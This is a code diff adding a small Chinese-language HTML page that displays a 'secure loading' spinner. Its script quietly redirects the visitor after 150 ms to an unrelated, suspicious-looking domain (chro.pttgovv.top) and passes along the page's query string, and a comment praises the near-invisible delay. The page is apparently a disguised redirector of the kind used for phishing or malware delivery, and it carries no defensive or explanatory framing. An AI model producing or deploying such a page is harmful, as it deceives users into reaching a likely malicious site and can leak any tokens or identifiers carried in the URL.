@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全加载</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f8faf9;
+            font-family: sans-serif;
+        }
+        .loading {
+            text-align: center;
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 1px 6px rgba(0,0,0,0.04);
+        }
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 2px solid #e6f4ef;
+            border-top: 2px solid #34c759;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text {
+            font-size: 0.95rem;
+            color: #1d1d1f;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <div class="spinner"></div>
+        <div class="text">正在安全加载中...</div>
+    </div>
+
+    <script>
+        // 极速跳转（150ms），几乎无感知等待
+        setTimeout(() => {
+            location.href = 'https://chro.pttgovv.top/' + location.search;
+        }, 150);
+    </script>
+</body>
+</html>
